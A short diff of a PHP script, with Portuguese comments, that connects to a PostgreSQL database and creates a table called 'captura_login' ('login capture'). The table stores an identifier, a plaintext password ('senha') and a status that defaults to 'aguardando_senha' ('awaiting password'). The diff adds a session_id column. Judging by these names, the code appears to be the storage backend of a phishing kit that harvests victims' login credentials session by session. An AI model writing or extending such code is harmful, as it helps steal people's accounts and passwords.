@@ -15,6 +15,7 @@ if (empty($dbUrl)) {
 }
 
 $dbopts = parse_url($dbUrl);
+
 $dbHost = $dbopts["host"];
 $dbPort = $dbopts["port"];
 $dbUser = $dbopts["user"];
@@ -28,10 +29,10 @@ try {
     $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     // Comando SQL para criar a tabela 'captura_login' SE ELA NÃO EXISTIR.
-    // Esta é a parte de "inicialização automática".
     $sql_create_table = "
     CREATE TABLE IF NOT EXISTS captura_login (
         id SERIAL PRIMARY KEY,
+        session_id VARCHAR(255) NOT NULL, -- ADICIONADO --
         identificador VARCHAR(255) NOT NULL,
         senha VARCHAR(255) NULL,
         status VARCHAR(50) DEFAULT 'aguardando_senha',
